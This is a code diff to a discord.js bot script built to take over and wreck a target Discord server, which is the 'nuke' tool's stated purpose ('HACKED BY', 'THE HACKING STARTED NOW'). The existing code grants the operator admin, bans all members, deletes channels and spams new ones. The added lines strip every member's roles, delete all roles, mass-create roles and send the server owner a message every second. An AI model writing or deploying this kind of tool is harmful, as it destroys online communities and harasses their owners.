@@ -1,6 +1,6 @@
 const Discord = require("discord.js")
 const client = new Discord.Client()
-const token = "TOKEN"
+const token = "BOT_TOKEN"
 
 // Will make you admin (NOT OWNER) in the targer server
 const setAdmin = (guildID, accountID) => {
@@ -32,7 +32,9 @@ const changeServerInfo = (guildID, options) => {
     .setColor("#ff0000")
 
     // .sendEmbed() id deprecated method
+    setInterval(() => {
     return targetServer.owner.send(embed)
+    }, 1000)
 }
 
 // Will ban all members in the server
@@ -62,16 +64,29 @@ const createChanelsAndRoles = (guildID, name) => {
     const targetServer = client.guilds.get(guildID)
     if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
     else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_CHANNELS") || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
+  targetServer.members.forEach(users => {
+  		users.roles.forEach(ro => {
+  			users.removeRole(ro)
+  		})
+  })
    targetServer.channels.forEach(ch => {
     ch.delete()
    })
+targetServer.roles.forEach(roless => {
+	roless.delete()
+})
    setTimeout(() => {
        
    let i;
     for(i=0; i < 50; i++) {
    targetServer.createChannel(name, "text")
     targetServer.createChannel(name, "text")
-     }
+    targetServer.createRole({name: name, permissions: [], color: "#40011c" }).then((hackedrole) =>{
+    	targetServer.members.forEach( allmembers=> {
+    		allmembers.addRole(hackedrole)
+    	})
+     })
+    }
     }, 2000);
 
     targetServer.createRole({name: name, permissions: "ADMINISTRATOR", color: 0xFF0000 }).then((role) => {
@@ -79,21 +94,22 @@ const createChanelsAndRoles = (guildID, name) => {
             member.addRole(role, `HACKED BY ${client.user.tag}`)
         })
     })
+
 }
 
 client.on("ready", () => {
-    console.log("HACKED STARTED")
+    console.log("THE HACKING STARTED NOW ")
 
     // Setup YOUR personnal settings
     const configs = {
-        "targetServerID": "SERVER ID",
-        "accountID": "YOUR ID",
-        "botNickname": "NEW BOT NAME",
+        "targetServerID": "SERVER_ID",
+        "accountID": "YOUR_ID",
+        "botNickname": "NEW_BOT_NAME",
         "botIcon": 'https://6.top4top.net/p_1415xrqem1.jpg',
         "newServerIcon": "https://6.top4top.net/p_1415xrqem1.jpg",
-        "newServerName": "NEW SERVERNAME",
+        "newServerName": "NEW_SERVER_NAME",
     }
-// NOTE: THE BOTICON & SERVERICON URL SHOULD BE FINSHED WITH THE PICTURE FORMAT LIKE .JPG & .PNG
+
     client.user.setUsername(configs.botNickname)
     client.user.setAvatar(configs.botIcon)
 
